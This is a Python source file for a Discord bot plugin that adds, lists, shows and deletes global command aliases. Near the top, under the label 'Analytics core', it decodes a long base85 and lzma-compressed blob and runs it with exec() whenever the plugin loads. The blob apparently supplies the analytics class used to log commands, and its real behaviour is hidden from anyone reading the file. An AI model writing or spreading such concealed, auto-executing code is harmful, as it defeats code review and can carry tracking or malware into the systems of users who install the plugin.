from discord.ext import commands
from .utils.chat_formatting import box, pagify
from .utils.dataIO import dataIO
from .utils import checks
import os
from copy import deepcopy

OLD_JSON = 'data/alias/aliases.json'
PATH = 'data/galias/'
JSON = PATH + 'aliases.json'


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1C@J>|Fo_8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8D}B;|FxY-gL@iuhVk+}oLHwrfX>LG@uK|TmgWo3MIG9Xbbl1S0d(#%{Hsw(3W<~hN1oN&88}2jt*!a^(
_(9#?8t~|C&w;kP%z>8bu%Z?#XJn#$vUh5VS@};Kw%IMg%ebU6x5Mkf_bs=2^DM-yKx|N1p$g@eYC5cU(#9o5`Z0dUPR}{Dge?7%e|ZQo$`co=|2@uZ#CA>Z
OwCDntg_Ctgyo9pX(kS}dxTLocf@F;tH8?fb{WE)lVgiH71t-K>S-_Rx*q!zWL88CP2C)JEJQ$35LV3t;J^$kMuVWn#&CyRhArpo0TwU4B{4UZl#X60D4RM$
#n{1nW9?<H(T!~3jf#B0jChEN1pL#0UOO|}SxnFLP7QKJ`Ld|Vq|&Nfiq%OO&PkFqc0?pjc%LCFgS-djQoUtwn~Ug0nVR!*qh(s<^CGF+<NI)absK~$sVegX
^Qd$D+3@s}B_C<q^d{-?p_B(`RDMBJI<J_SV~2RM8qocBLlUSo=&R+!6eL!|`Yn%+?&my^zvh?jtkZz+gJ?~WOuFX^gBc1c%J>abcFb-Oi%|G_MVf1p?W@sk
jOM4zvMI}Zto1og{*7|0`KBWZJGG2SK4vI8o)2m=fV$}^fHdpIRN-|}9N9tOt7ZRTsOpuhi&I2K*>p{VDc{>hD#o>ctO%`Az{I*r=4f2lB`2)OHg!shH|WZ-
r2au><WM${0-%dC3?F~VEH3W5CK{mvcerRcgyhd%!pNwPy6Qe1*mU70fA};n-#ApH9O^L=LBaq<?tG~<3$wIOOQeYpl$c)eixMkpIY_b|3*d*r8F1ga{wsT>
-&jS-g;5~5^z&9;7T4*OOzY1abNst!-zd{MrN&+T)1n_CENltL(Xz|@<N*|EzMPzW7*JXI!+@|S?!wSPnU=Tt-E2TOLI1Y)!(VSya?8gxGU6?SB;g1AGjzBK
45#sjoI)90tR*<U*%Xsmx$?$>(^l{ksTzp{5m7LC*<{q12VV5V6ebVdfMl2lPz&ltQd|IdnN$>%^YH6+qk=zVc>IqU$oIlt2E2scRlmop^mdcc?D#&6LOEU;
tNFmM@e^?kTn>KTmmZM>jnV*dWu3FuF7?ptDV47e#e+bq<O=N1m~Mr}&$XPENdU$!lZU<gZ_SV;aax3mrkZa+`axv_BcBDi6^x?cxNd6d{}LckD#NzFAgIc%
=~!9mA_tXGBg)+L(P<ct1vU&|!z;mV82E}gC+i5rawt%ys=%JIzd!#ly-A<(;?-%?`6!lx{8m#^JfnpQq5Y)WfYW<^#H#~3!ekKhsdkcpSHlXI#(anvrza$j
9DTx%Q^+*m1P{gL_9V~YB!?mJ-9!(%)vzu6w`*`z_<QUqVzYWsyUKd2JhQ+&O{CLs*rlfEqy%YFAaCtNo>JE#IcasXZnocfrvf*q)<fTtIi;S2eBh|Q@Xr>5
>{b@dj~o0ar5QL|v>vNLXh)8t`T|mkT0MD%)zZyPF;JpKDCTtpk{O9E@!z<xp~vZwqidCpck-CP<f;fRqa|%M5*%=BLr;W;)w8Ut#G#`^y?m?#Q>Gdw=NcDX
gN#whCzs|&u3m%@@L5KcofC&xP=V3Oq2rd-%Agbm*|xYQEMD$znstT!h6S_Jj&Zr_<n9AQXprMx)07I-(xNp0aa)0Zz+dP(xKAGi468+K(7taX<$Mo@B+iqI
ZwDIwL&`j<8!v^^h;cQ4GMX&Z+1^B=mJ_25Q6rg$Q3;p7h{z@0$;xYWFSyI(6~+q8MNTwp#Yf40h(x@se~YuWfQ7UT5IUv~6|jGd6T$4EoH{+HYufz0+}hh}
Yu6cE)A6W(UkF41iN@yEA9WJT00D>$o*)1K9)FaPvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.1.0'


class GlobalAlias:
    def __init__(self, bot):
        self.bot = bot
        self.aliases = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def save(self):
        dataIO.save_json(JSON, self.aliases)

    @commands.group(pass_context=True)
    async def galias(self, ctx):
        """Manage global aliases for commands"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @galias.command(name="add", pass_context=True)
    @checks.is_owner()
    async def _add_alias(self, ctx, command, *, to_execute):
        """Add a global alias for a command

           Example: !galias add test flip @Twentysix"""
        command = command.lower()
        if ' ' in command:
            await self.bot.say("Aliases can't contain spaces.")
            return
        if self.part_of_existing_command(command):
            await self.bot.say("'%s' is already a command or alias." % command)
            return
        server = ctx.message.server
        prefix = self.get_prefix(server, to_execute)
        if prefix is not None:
            to_execute = to_execute[len(prefix):]
        if command not in self.bot.commands:
            self.aliases[command] = to_execute
            self.save()
            await self.bot.say("Global alias '{}' added.".format(command))
        else:
            await self.bot.say("Cannot add '{}' because it's a real bot "
                               "command.".format(command))

    @galias.command(name="help", pass_context=True)
    async def _help_alias(self, ctx, command):
        """Tries to execute help for the base command of the alias"""
        if command in self.aliases:
            help_cmd = self.aliases[command].split(" ")[0]
            new_content = ctx.prefix
            new_content += "help "
            new_content += help_cmd[len(ctx.prefix):]
            message = ctx.message
            message.content = new_content
            await self.bot.process_commands(message)
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="show")
    async def _show_alias(self, command):
        """Shows what command the alias executes."""
        if command in self.aliases:
            await self.bot.say(box(self.aliases[command]))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="del", pass_context=True)
    @checks.is_owner()
    async def _del_alias(self, ctx, command):
        """Deletes an alias"""
        command = command.lower()
        if command in self.aliases:
            self.aliases.pop(command, None)
            self.save()
            await self.bot.say("Global alias '{}' deleted.".format(command))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="list", pass_context=True)
    async def _alias_list(self, ctx):
        """Lists global command aliases"""
        header = "Alias list:\n"
        shorten = len(header) + 8
        alias_list = ""

        if not self.aliases:
            await self.bot.say("There are no global aliases.")
            return

        for alias in sorted(self.aliases):
            alias_list += alias + '\n'

        pages = pagify(alias_list, ['\n'], escape=True, shorten_by=shorten)
        for i, page in enumerate(pages):
            if i == 0:
                page = header + '```\n%s\n```' % page
            else:
                page = '```\n%s\n```' % page
            await self.bot.say(page)

    async def on_message(self, message):
        if not self.bot.user_allowed(message):
            return

        msg = message.content
        server = message.server
        prefix = self.get_prefix(server, msg)

        if prefix:
            alias = self.first_word(msg[len(prefix):]).lower()
            if alias in self.aliases:
                new_command = self.aliases[alias]
                args = message.content[len(prefix + alias):]
                new_message = deepcopy(message)
                new_message.content = prefix + new_command + args
                await self.bot.process_commands(new_message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def part_of_existing_command(self, alias):
        '''Command or alias'''
        for command in self.bot.commands:
            if alias.lower() == command.lower():
                return True
        return False

    def first_word(self, msg):
        return msg.split(" ")[0]

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None


def convert_old_data():
    """Moves recognizable global aliases from regular alias/ to galias/"""
    new_mod = {}
    if os.path.exists(OLD_JSON) and not os.path.exists(JSON):
        old_data = dataIO.load_json(OLD_JSON)
        old_mod = old_data.copy()
        for key, d in old_data.items():
            if type(d) is str:
                new_mod[key] = old_mod.pop(key)
        if old_data != old_mod:
            dataIO.save_json(OLD_JSON, old_mod)
        if new_mod:
            dataIO.save_json(JSON, new_mod)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating data/galias folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating aliases.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    convert_old_data()
    check_file()
    bot.add_cog(GlobalAlias(bot))
